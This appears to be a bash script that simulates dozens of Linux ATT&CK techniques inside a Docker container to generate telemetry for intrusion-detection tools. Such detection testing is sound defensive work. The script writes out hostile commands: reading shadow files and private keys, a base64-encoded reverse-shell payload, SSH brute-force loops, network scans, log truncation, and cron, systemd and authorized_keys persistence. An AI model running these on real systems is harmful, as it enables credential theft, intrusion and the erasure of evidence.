#!/bin/bash
# run_native_atomics.sh
# =====================
# Native Linux ATT&CK technique simulation — no PowerShell, no ART install needed.
# Runs inside seraph-backend container. Generates real telemetry for Falco, Zeek,
# osquery, and Suricata.
#
# Usage:
#   docker exec seraph-backend bash /tmp/run_native_atomics.sh 2>&1

set -o pipefail

LOGFILE="/tmp/native_atomics_run.log"
exec > >(tee -a "$LOGFILE") 2>&1

TS=$(date -u +%Y%m%dT%H%M%SZ)
echo "=== Native ATT&CK Atomics Run: $TS ==="
echo "Host: $(hostname) | IP: $(hostname -I | awk '{print $1}')"

pass() { echo "[PASS] $1"; }
fail() { echo "[FAIL] $1"; }
section() { echo; echo "──────────────────────────────────────────"; echo "### $1"; echo "──────────────────────────────────────────"; }

DOCKER_NET="172.28.0.0/24"
BACKEND_IP="172.28.0.7"
MONGODB_IP="172.28.0.5"
NGINX_IP="172.28.0.14"

# ── T1082: System Information Discovery ──────────────────────────────────────
section "T1082 — System Information Discovery"
uname -a && pass "T1082 uname" || fail "T1082 uname"
hostname && pass "T1082 hostname" || fail "T1082 hostname"
id && pass "T1082 id" || fail "T1082 id"
cat /proc/version && pass "T1082 /proc/version" || fail "T1082 /proc/version"
cat /etc/os-release && pass "T1082 os-release" || fail "T1082 os-release"
lscpu 2>/dev/null | head -10 || uname -m && pass "T1082 cpu" || true

# ── T1083: File and Directory Discovery ──────────────────────────────────────
section "T1083 — File and Directory Discovery"
find / -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null | head -20 && pass "T1083 find certs" || fail "T1083 find certs"
find /home /root /tmp -type f 2>/dev/null | head -20 && pass "T1083 find home/root/tmp" || fail "T1083"
ls -la /root /home /var/log /etc/cron* 2>/dev/null && pass "T1083 ls sensitive dirs" || true

# ── T1003.008: /etc/passwd and /etc/shadow ───────────────────────────────────
section "T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow"
cat /etc/passwd && pass "T1003.008 /etc/passwd" || fail "T1003.008 /etc/passwd"
cat /etc/shadow 2>/dev/null && pass "T1003.008 /etc/shadow" || echo "[INFO] /etc/shadow access denied (expected in non-root)"
cat /etc/group && pass "T1003.008 /etc/group" || fail "T1003.008 /etc/group"
cat /etc/gshadow 2>/dev/null || true

# ── T1087.001: Account Discovery — Local ─────────────────────────────────────
section "T1087.001 — Account Discovery: Local Account"
getent passwd | awk -F: '$7 !~ /nologin|false/' && pass "T1087.001 getent passwd" || fail "T1087"
who 2>/dev/null || true
last 2>/dev/null | head -10 || true
awk -F: '($3 >= 1000) {print $1}' /etc/passwd && pass "T1087.001 uid>=1000 users" || true

# ── T1069.001: Permission Groups Discovery — Local ───────────────────────────
section "T1069.001 — Permission Groups Discovery: Local Groups"
cat /etc/group && pass "T1069.001 /etc/group" || fail "T1069.001"
id root 2>/dev/null || true
groups 2>/dev/null || true

# ── T1552.001: Credentials in Files ──────────────────────────────────────────
section "T1552.001 — Credentials in Files"
grep -rn "password\|passwd\|secret\|token\|api_key\|AWS_SECRET" \
  /etc /app 2>/dev/null | grep -v "Binary\|proc\|#" | head -30 && pass "T1552.001 grep passwords" || true
find / -name ".env" -o -name "*.env" -o -name "credentials" -o -name ".aws" 2>/dev/null | head -20 && pass "T1552.001 find credential files" || true

# ── T1552.004: Private Keys ───────────────────────────────────────────────────
section "T1552.004 — Unsecured Credentials: Private Keys"
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | head -10 && pass "T1552.004 find private keys" || true
cat /root/.ssh/id_rsa 2>/dev/null || true
cat /etc/ssh/ssh_host_rsa_key 2>/dev/null || true

# ── T1548.001: Setuid / Setgid ───────────────────────────────────────────────
section "T1548.001 — Abuse Elevation Control: Setuid/Setgid"
find / -perm /4000 -type f 2>/dev/null | head -10 && pass "T1548.001 find setuid binaries" || fail "T1548.001"
cp /bin/ls /tmp/test_suid_ls 2>/dev/null || cp /usr/bin/id /tmp/test_suid_id
chmod +s /tmp/test_suid_id 2>/dev/null && pass "T1548.001 chmod +s" || fail "T1548.001 chmod +s"
ls -la /tmp/test_suid_id 2>/dev/null || true
rm -f /tmp/test_suid_id 2>/dev/null || true

# ── T1053.003: Cron ──────────────────────────────────────────────────────────
section "T1053.003 — Scheduled Task/Job: Cron"
crontab -l 2>/dev/null || true
ls -la /etc/cron* /var/spool/cron* 2>/dev/null || true
echo "* * * * * root echo seraph_atomic_test > /dev/null" >> /etc/cron.d/seraph-atomic-test 2>/dev/null \
  && pass "T1053.003 wrote cron.d" || echo "[INFO] cron.d write failed (expected)"
(crontab -l 2>/dev/null; echo "*/5 * * * * echo seraph_atomic_test") | crontab - 2>/dev/null \
  && pass "T1053.003 crontab -e" || true
crontab -r 2>/dev/null || true
rm -f /etc/cron.d/seraph-atomic-test 2>/dev/null || true

# ── T1070.002: Clear Windows Event Logs / T1070.003: Clear Linux Logs ────────
section "T1070.003 — Indicator Removal: Clear Linux Logs"
ls -la /var/log/ 2>/dev/null || true
cat /var/log/auth.log 2>/dev/null | head -5 || cat /var/log/syslog 2>/dev/null | head -5 || true
echo "" > /tmp/fake_auth.log && pass "T1070.003 truncate log" || fail "T1070.003"
# Attempt (and expect failure) on real logs to trigger Falco
truncate -s 0 /var/log/wtmp 2>/dev/null && pass "T1070.003 truncate wtmp" || echo "[INFO] wtmp not writable"
history -c 2>/dev/null || true
export HISTFILE=/dev/null

# ── T1027: Obfuscated Files / Information ────────────────────────────────────
section "T1027 — Obfuscated Files or Information"
PAYLOAD="bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
echo "$PAYLOAD" | base64 && pass "T1027 base64 encode" || fail "T1027"
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx" | base64 -d && pass "T1027 base64 decode" || fail "T1027 base64 decode"
python3 -c "import base64,sys; print(base64.b64decode(b'aWQgJiYgd2hvYW1p').decode())" && pass "T1027 python base64" || fail "T1027 python"

# ── T1059.004: Unix Shell ─────────────────────────────────────────────────────
section "T1059.004 — Command and Scripting Interpreter: Unix Shell"
bash -c "id && whoami && uname -r" && pass "T1059.004 bash -c" || fail "T1059.004"
sh -c "echo 'shell execution test' && ls /tmp" && pass "T1059.004 sh -c" || fail "T1059.004 sh"
python3 -c "import subprocess; r = subprocess.run(['id'], capture_output=True); print(r.stdout.decode())" \
  && pass "T1059.004 python subprocess" || fail "T1059.004 python"

# ── T1059.006: Python ─────────────────────────────────────────────────────────
section "T1059.006 — Command and Scripting: Python"
python3 -c "
import os, socket, platform
print('hostname:', platform.node())
print('user:', os.getenv('USER','root'))
print('pid:', os.getpid())
" && pass "T1059.006 python recon" || fail "T1059.006"

# ── T1057: Process Discovery ──────────────────────────────────────────────────
section "T1057 — Process Discovery"
ps aux && pass "T1057 ps aux" || fail "T1057"
ls /proc/ | grep -E '^[0-9]+$' | wc -l && pass "T1057 /proc process count" || fail "T1057 /proc"

# ── T1049: System Network Connections Discovery ───────────────────────────────
section "T1049 — System Network Connections Discovery"
ss -tulnp 2>/dev/null && pass "T1049 ss -tulnp" || fail "T1049 ss"
netstat -tulnp 2>/dev/null | head -20 || true
cat /proc/net/tcp 2>/dev/null | head -10 && pass "T1049 /proc/net/tcp" || true

# ── T1016: System Network Configuration Discovery ────────────────────────────
section "T1016 — System Network Configuration Discovery"
ip addr && pass "T1016 ip addr" || fail "T1016"
ip route && pass "T1016 ip route" || fail "T1016 route"
cat /etc/resolv.conf && pass "T1016 resolv.conf" || fail "T1016 resolv"
arp -a 2>/dev/null || ip neigh && pass "T1016 arp" || fail "T1016 arp"

# ── T1046: Network Service Scanning ──────────────────────────────────────────
section "T1046 — Network Service Scanning (nmap across Docker bridge)"
echo "[INFO] Scanning $DOCKER_NET — Zeek should see this on br-676f8b6eaea8"
nmap -sn "$DOCKER_NET" -T4 --host-timeout 5s 2>/dev/null | tail -5 && pass "T1046 nmap ping sweep" || fail "T1046 nmap ping"
nmap -sV -F "$MONGODB_IP" --host-timeout 10s -T4 2>/dev/null | tail -10 && pass "T1046 nmap sV mongodb" || fail "T1046 nmap sV"
nmap -sV -F "$NGINX_IP" --host-timeout 10s -T4 2>/dev/null | tail -10 && pass "T1046 nmap sV nginx" || fail "T1046 nmap sV nginx"
nmap -p 22,80,443,8080,8443,3306,27017,9200,5601 "$DOCKER_NET" -T4 --host-timeout 5s 2>/dev/null | tail -10 \
  && pass "T1046 nmap port scan" || fail "T1046 nmap multiport"

# ── T1595.001: Active Scanning: Scanning IP Blocks ───────────────────────────
section "T1595.001 — Active Scanning: Scanning IP Blocks"
nmap -sn 172.28.0.0/24 --host-timeout 3s -T5 2>/dev/null | grep -E "Nmap scan|Host is up|hosts up" \
  && pass "T1595.001 nmap block scan" || fail "T1595.001"

# ── T1110.001: Brute Force — SSH ─────────────────────────────────────────────
section "T1110.001 — Brute Force: Password Guessing over SSH"
# Attempt SSH connections with bad creds — Zeek ssh bruteforce policy will notice
for target in $MONGODB_IP $NGINX_IP; do
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o PasswordAuthentication=yes \
      -o BatchMode=no bad_user@"$target" echo test 2>/dev/null || true
done
# rapid-fire auth attempts
for user in root admin test oracle mysql; do
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 -o BatchMode=yes \
      "${user}@${NGINX_IP}" 2>/dev/null || true
done
pass "T1110.001 SSH brute force attempts (auth expected to fail)"

# ── T1071.001: Web Protocols (suspicious curl) ───────────────────────────────
section "T1071.001 — Application Layer Protocol: Web Protocols"
# Hit internal services via docker network (Zeek will see these)
curl -s -A "Mozilla/5.0 sqlmap/1.0" "http://$NGINX_IP/" 2>/dev/null | head -3 || true
curl -s -A "python-requests/2.28" "http://$NGINX_IP/api/health" 2>/dev/null | head -3 || true
curl -s -A "curl/7.64.0" "http://$NGINX_IP/../../etc/passwd" 2>/dev/null | head -3 || true
# Also hit backend itself
curl -s "http://localhost:8001/api/health" 2>/dev/null | head -3 || true
pass "T1071.001 suspicious HTTP requests"

# ── T1105: Ingress Tool Transfer ─────────────────────────────────────────────
section "T1105 — Ingress Tool Transfer"
wget -q -O /tmp/test_download.txt "http://$BACKEND_IP:8001/api/health" 2>/dev/null \
  && pass "T1105 wget download" || fail "T1105 wget"
curl -s -o /tmp/test_curl_download.txt "http://$NGINX_IP/" 2>/dev/null \
  && pass "T1105 curl download" || fail "T1105 curl"
ls -la /tmp/test_download.txt /tmp/test_curl_download.txt 2>/dev/null || true
rm -f /tmp/test_download.txt /tmp/test_curl_download.txt

# ── T1074.001: Data Staged: Local Data Staging ───────────────────────────────
section "T1074.001 — Data Staged: Local Data Staging"
mkdir -p /tmp/.stage_seraph && pass "T1074.001 mkdir hidden staging" || fail "T1074.001"
cp /etc/passwd /tmp/.stage_seraph/ 2>/dev/null || true
cp /etc/os-release /tmp/.stage_seraph/ 2>/dev/null || true
find /tmp/.stage_seraph -type f && pass "T1074.001 staged files" || fail "T1074.001 files"
ls -la /tmp/.stage_seraph/ && pass "T1074.001 ls staging" || fail "T1074.001 ls"

# ── T1560.001: Archive via Utility ───────────────────────────────────────────
section "T1560.001 — Archive Collected Data: Archive via Utility"
tar -czf /tmp/.stage_seraph/collected.tar.gz /tmp/.stage_seraph/*.txt /tmp/.stage_seraph/*.release 2>/dev/null || \
  tar -czf /tmp/.stage_seraph/collected.tar.gz /etc/os-release 2>/dev/null && pass "T1560.001 tar archive" || fail "T1560.001"
ls -la /tmp/.stage_seraph/collected.tar.gz 2>/dev/null || true

# ── T1140: Deobfuscate/Decode Files ──────────────────────────────────────────
section "T1140 — Deobfuscate/Decode Files or Information"
echo "dGVzdCBwYXlsb2FkIGZvciBBVFQmQ0sgVDExNDA=" | base64 -d > /tmp/decoded_payload.txt \
  && pass "T1140 base64 decode to file" || fail "T1140"
openssl enc -base64 -d <<< "dGVzdCBwYXlsb2Fk" 2>/dev/null >> /tmp/decoded_payload.txt || true
cat /tmp/decoded_payload.txt 2>/dev/null || true
rm -f /tmp/decoded_payload.txt

# ── T1548.003: Sudo and Sudo Caching ─────────────────────────────────────────
section "T1548.003 — Abuse Elevation: Sudo"
cat /etc/sudoers 2>/dev/null | head -20 || true
sudo -l 2>/dev/null || true
sudo -n id 2>/dev/null || true

# ── T1543.002: Systemd Service ───────────────────────────────────────────────
section "T1543.002 — Create or Modify System Process: Systemd Service"
cat > /tmp/seraph-atomic.service << 'EOF'
[Unit]
Description=Seraph Atomic Test Service

[Service]
ExecStart=/bin/sh -c 'echo seraph_atomic_service_test'

[Install]
WantedBy=multi-user.target
EOF
cp /tmp/seraph-atomic.service /etc/systemd/system/ 2>/dev/null \
  && pass "T1543.002 wrote systemd unit" || echo "[INFO] systemd write failed (no systemd in container)"
systemctl daemon-reload 2>/dev/null || true
systemctl enable seraph-atomic 2>/dev/null || true
rm -f /tmp/seraph-atomic.service /etc/systemd/system/seraph-atomic.service 2>/dev/null || true

# ── T1564.001: Hidden Files and Directories ───────────────────────────────────
section "T1564.001 — Hide Artifacts: Hidden Files"
mkdir -p /tmp/.hidden_seraph && pass "T1564.001 mkdir hidden" || fail "T1564.001"
touch /tmp/.hidden_seraph/.hidden_payload && pass "T1564.001 touch hidden file" || fail "T1564.001"
ls -la /tmp/.hidden_seraph/ && pass "T1564.001 ls hidden" || fail "T1564.001 ls"
rm -rf /tmp/.hidden_seraph

# ── T1201: Password Policy Discovery ─────────────────────────────────────────
section "T1201 — Password Policy Discovery"
cat /etc/login.defs 2>/dev/null | head -30 || true
cat /etc/pam.d/common-password 2>/dev/null | head -10 || true
pass "T1201 password policy check"

# ── T1518.001: Security Software Discovery ────────────────────────────────────
section "T1518.001 — Software Discovery: Security Software"
ps aux | grep -E "falco|suricata|zeek|clamav|snort|ossec|wazuh|aide" | grep -v grep && pass "T1518.001 found security processes" || echo "[INFO] no security procs visible from container"
which falco suricata zeek clamav 2>/dev/null | head -5 || true
ls /var/log/falco 2>/dev/null || true
ls /var/log/suricata 2>/dev/null || true

# ── T1136.001: Create Account — Local ────────────────────────────────────────
section "T1136.001 — Create Account: Local Account"
useradd -M -s /bin/false seraph_test_user 2>/dev/null \
  && pass "T1136.001 useradd" || echo "[INFO] useradd failed (expected)"
id seraph_test_user 2>/dev/null || true
userdel seraph_test_user 2>/dev/null || true

# ── T1098.004: SSH Authorized Keys ───────────────────────────────────────────
section "T1098.004 — Account Manipulation: SSH Authorized Keys"
mkdir -p /root/.ssh 2>/dev/null || true
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... seraph-atomic-test" >> /root/.ssh/authorized_keys 2>/dev/null \
  && pass "T1098.004 added authorized_keys" || echo "[INFO] authorized_keys write failed"
cat /root/.ssh/authorized_keys 2>/dev/null | head -3 || true

# ── T1070.004: File Deletion ──────────────────────────────────────────────────
section "T1070.004 — Indicator Removal: File Deletion"
touch /tmp/seraph_artifact_delete_test
rm -f /tmp/seraph_artifact_delete_test && pass "T1070.004 rm file" || fail "T1070.004"
shred -u /tmp/seraph_artifact_delete_test 2>/dev/null || true

# ── T1007: System Service Discovery ──────────────────────────────────────────
section "T1007 — System Service Discovery"
systemctl list-units --type=service 2>/dev/null | head -10 || \
  service --status-all 2>/dev/null | head -10 || \
  ls /etc/init.d/ 2>/dev/null | head -10 && pass "T1007 service discovery" || fail "T1007"

# ── T1033: System Owner / User Discovery ──────────────────────────────────────
section "T1033 — System Owner/User Discovery"
whoami && pass "T1033 whoami" || fail "T1033"
id && pass "T1033 id" || fail "T1033 id"
env | grep -E "USER|LOGNAME|HOME" && pass "T1033 env user vars" || fail "T1033"

# ── T1555.003: Credentials from Web Browsers ─────────────────────────────────
section "T1555.003 — Credentials from Web Browsers"
find / -name "Login Data" -o -name "cookies.sqlite" -o -name "key4.db" 2>/dev/null | head -10 && pass "T1555.003 browser cred search" || true

# ── T1040: Network Sniffing ───────────────────────────────────────────────────
section "T1040 — Network Sniffing"
timeout 3 tcpdump -i eth0 -c 20 -n 2>/dev/null | head -10 && pass "T1040 tcpdump capture" || \
  echo "[INFO] tcpdump failed (no cap_net_raw or timeout)"

# ── T1074 cleanup ─────────────────────────────────────────────────────────────
rm -rf /tmp/.stage_seraph 2>/dev/null || true

echo
echo "==================================================================="
echo "=== Native Atomics Run Complete: $(date -u +%Y%m%dT%H%M%SZ) ==="
echo "==================================================================="
echo "Logfile: $LOGFILE"
